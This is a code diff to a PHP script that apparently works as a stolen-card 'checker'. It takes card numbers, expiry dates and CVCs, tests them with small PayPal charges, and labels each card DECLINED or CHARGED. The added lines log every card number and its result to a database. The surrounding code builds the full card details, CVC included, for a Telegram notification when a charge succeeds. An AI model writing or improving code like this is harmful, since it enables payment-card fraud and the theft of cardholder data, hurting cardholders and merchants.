@@ -27,6 +27,9 @@ header('Content-Type: application/json');
 ini_set('log_errors', 1);
 ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');
 
+// Include globalstats.php for recordCardCheck function
+require_once __DIR__ . '/globalstats.php';
+
 // --- MOVED log_message function to the top to prevent 500 errors ---
 // Optional file-based logging for debugging
  $log_file = __DIR__ . '/paypal0.1$_debug.log';
@@ -302,6 +305,10 @@ if (!isset($_POST['card']) || !is_array($_POST['card'])) {
 if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
     $errorMsg = ['status' => 'DECLINED', 'message' => 'Missing card details', 'response' => 'MISSING_CARD_DETAILS'];
     log_message('Error 400: ' . json_encode($errorMsg));
+    
+    // Record the card check result in the database
+    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'DECLINED', 'Missing card details');
+    
     echo json_encode($errorMsg);
     exit;
 }
@@ -354,6 +361,10 @@ if ($httpCode != 200 || !isset($apx['id'])) {
         'response' => $errorMsg
     ];
     log_message('Payment Method Error: ' . json_encode($responseMsg));
+    
+    // Record the card check result in the database
+    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'DECLINED', $errorMsg);
+    
     echo json_encode($responseMsg);
     exit;
 }
@@ -455,6 +466,10 @@ if (isset($apx1["failureType"])) {
         'response' => $apl
     ];
     log_message('Payment Declined: ' . json_encode($responseMsg));
+    
+    // Record the card check result in the database
+    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'DECLINED', $apl);
+    
     echo json_encode($responseMsg);
 } else {
     $responseMsg = [
@@ -463,6 +478,9 @@ if (isset($apx1["failureType"])) {
         'response' => 'CHARGED'
     ];
     log_message('Payment Successful: ' . json_encode($responseMsg));
+    
+    // Record the card check result in the database
+    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'CHARGED', 'Your card has been charged $5.00 successfully.');
     
     // Send Telegram notification for CHARGED status
     $card_details = "$cardNumber|$expMonth|$expYear|$cvc";
